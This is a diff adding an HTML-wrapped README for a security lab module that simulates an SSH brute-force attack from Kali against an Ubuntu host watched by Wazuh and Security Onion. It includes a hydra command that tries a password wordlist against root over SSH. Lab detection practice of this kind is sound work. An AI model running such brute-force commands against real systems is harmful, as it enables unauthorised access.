@@ -1,0 +1,44 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<title>README</title></head><body>
+<h1>README</h1>
+<pre># Attack Module 1 — SSH Brute Force
+
+## Objective
+
+Simulate SSH brute force from Kali against Ubuntu.
+
+## Attack Map
+
+| System | Role | IP |
+|---|---|---|
+| Kali | attacker | 192.168.117.129 |
+| Ubuntu | target | 192.168.117.30 |
+| Wazuh | SIEM | 192.168.117.50 |
+| Security Onion | NDR | 192.168.117.10 |
+| Prometheus | metrics | 192.168.117.30:9090 |
+| Grafana | dashboards | 192.168.117.30:3000 |
+| Nagios | availability | 192.168.117.30 |
+
+## Command
+
+```bash
+hydra -l root -P small_wordlist.txt -vV ssh://192.168.117.30
+```
+
+## Expected Output
+
+```text
+[ATTEMPT]
+[22][ssh]
+```
+
+## Evidence
+
+```text
+attacks/brute-force/screenshots/hydra-terminal.png
+attacks/brute-force/screenshots/failed-logons.png
+attacks/brute-force/logs/ssh-bruteforce.log
+gifs/simulations/end-to-end-bruteforce.gif
+```
+</pre>
+</body></html>
